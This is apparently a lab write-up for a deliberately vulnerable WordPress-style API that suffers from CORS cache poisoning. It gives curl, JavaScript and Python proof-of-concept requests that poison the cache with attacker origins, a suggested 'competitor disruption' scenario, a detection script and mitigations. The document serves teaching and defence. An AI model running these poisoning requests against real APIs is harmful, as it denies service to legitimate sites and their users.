# CORS Cache Poisoning Exploitation Guide

## Vulnerability Overview

This application demonstrates a **CORS Cache Poisoning** vulnerability in WordPress-like APIs. The server caches responses without considering the `Origin` header in the cache key, allowing attackers to poison the cache with malicious CORS headers.

## Technical Details

### Root Cause
- Server echoes `Origin` header in `Access-Control-Allow-Origin` response
- Responses are cached using only the URL path as cache key
- Missing `Vary: Origin` header in cache configuration
- Cache doesn't differentiate between different origins

### Vulnerable Endpoints
- `/wp-json/wp/v2/posts` - Blog posts API
- `/wp-json/wp/v2/categories` - Categories API  
- `/wp-json/wp/v2/tags` - Tags API
- `/wp-json/*` - All WordPress API endpoints

## Exploitation Steps

### Step 1: Clear Cache (Optional)
```bash
curl -H "Origin: https://evil.com" \
     https://cachecorsdos.vercel.app/clear-cache
```

### Step 2: Poison the Cache
Make requests from attacker-controlled origin to populate cache:

```bash
# Poison posts endpoint
curl -H "Origin: https://attacker.com" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
     https://cachecorsdos.vercel.app/wp-json/wp/v2/posts

# Response headers:
# Access-Control-Allow-Origin: https://attacker.com
# X-Cache: miss
```

### Step 3: Victim Request
Legitimate users from different origins get wrong CORS headers:

```bash
# Victim request
curl -H "Origin: https://legitimate-site.com" \
     https://cachecorsdos.vercel.app/wp-json/wp/v2/posts

# Response headers:
# Access-Control-Allow-Origin: https://attacker.com  â† Wrong origin!
# X-Cache: hit
```

### Step 4: CORS Failure
Browser blocks the request due to CORS policy violation:
```
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource. 
(Reason: CORS header 'Access-Control-Allow-Origin' does not match 'https://legitimate-site.com')
```

## Proof of Concept Scripts

### JavaScript PoC (Browser)
```javascript
// 1. Poison cache from attacker origin
fetch('https://cachecorsdos.vercel.app/wp-json/wp/v2/posts', {
  method: 'GET',
  credentials: 'omit'
}).then(r => console.log('Cache poisoned'));

// 2. Victim request (will fail with CORS error)
fetch('https://cachecorsdos.vercel.app/wp-json/wp/v2/posts')
  .then(r => r.json())
  .catch(e => console.log('CORS Error:', e));
```

### Python PoC
```python
import requests

# Poison cache
poison_headers = {'Origin': 'https://evil.com'}
r1 = requests.get('https://cachecorsdos.vercel.app/wp-json/wp/v2/posts', 
                  headers=poison_headers)
print(f"Poison: {r1.headers.get('Access-Control-Allow-Origin')}")

# Victim request  
victim_headers = {'Origin': 'https://victim.com'}
r2 = requests.get('https://cachecorsdos.vercel.app/wp-json/wp/v2/posts',
                  headers=victim_headers)
print(f"Victim gets: {r2.headers.get('Access-Control-Allow-Origin')}")
```

## Impact Assessment

### Denial of Service
- Legitimate cross-origin requests fail
- API becomes unusable for affected origins
- Affects all cached endpoints simultaneously

### Attack Scenarios
1. **Competitor Disruption**: Poison cache to block competitor websites
2. **Service Degradation**: Make API unreliable for legitimate users  
3. **Targeted DoS**: Block specific domains from accessing API

### Affected Users
- Any website making cross-origin requests to the API
- Mobile apps using web views
- Third-party integrations
- Browser extensions

## Detection Methods

### Response Headers Analysis
```bash
# Check for cache poisoning indicators
curl -I https://cachecorsdos.vercel.app/wp-json/wp/v2/posts \
     -H "Origin: https://test.com"

# Look for:
# X-Cache: hit (cached response)
# Access-Control-Allow-Origin: <different-origin>
# Missing: Vary: Origin
```

### Automated Detection
```bash
#!/bin/bash
# Poison cache
curl -s -H "Origin: https://poison.test" \
     https://cachecorsdos.vercel.app/wp-json/wp/v2/posts > /dev/null

# Test victim
CORS_HEADER=$(curl -s -I -H "Origin: https://victim.test" \
              https://cachecorsdos.vercel.app/wp-json/wp/v2/posts | \
              grep -i "access-control-allow-origin" | \
              cut -d' ' -f2-)

if [[ "$CORS_HEADER" == *"poison.test"* ]]; then
    echo "VULNERABLE: Cache poisoning detected"
else
    echo "Not vulnerable"
fi
```

## Mitigation Strategies

### 1. Add Vary Header
```javascript
res.setHeader('Vary', 'Origin');
```

### 2. Include Origin in Cache Key
```javascript
const cacheKey = `${baseUrl}:${origin}`;
```

### 3. Validate Origins
```javascript
const allowedOrigins = ['https://trusted1.com', 'https://trusted2.com'];
const responseOrigin = allowedOrigins.includes(origin) ? origin : null;
```

### 4. Disable Caching for CORS
```javascript
if (req.headers.origin) {
    res.setHeader('Cache-Control', 'no-cache, no-store');
}
```

## Timeline

- **Discovery**: Cache poisoning via Origin header reflection
- **Exploitation**: Successful DoS against legitimate origins  
- **Impact**: All WordPress API endpoints affected
- **Mitigation**: Requires cache key modification or origin validation

## References

- [CORS Cache Poisoning Research](https://portswigger.net/research/cors)
- [WordPress REST API Documentation](https://developer.wordpress.org/rest-api/)
- [MDN CORS Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

**Severity**: High  
**CVSS**: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)  
**Category**: Denial of Service, Cache Poisoning
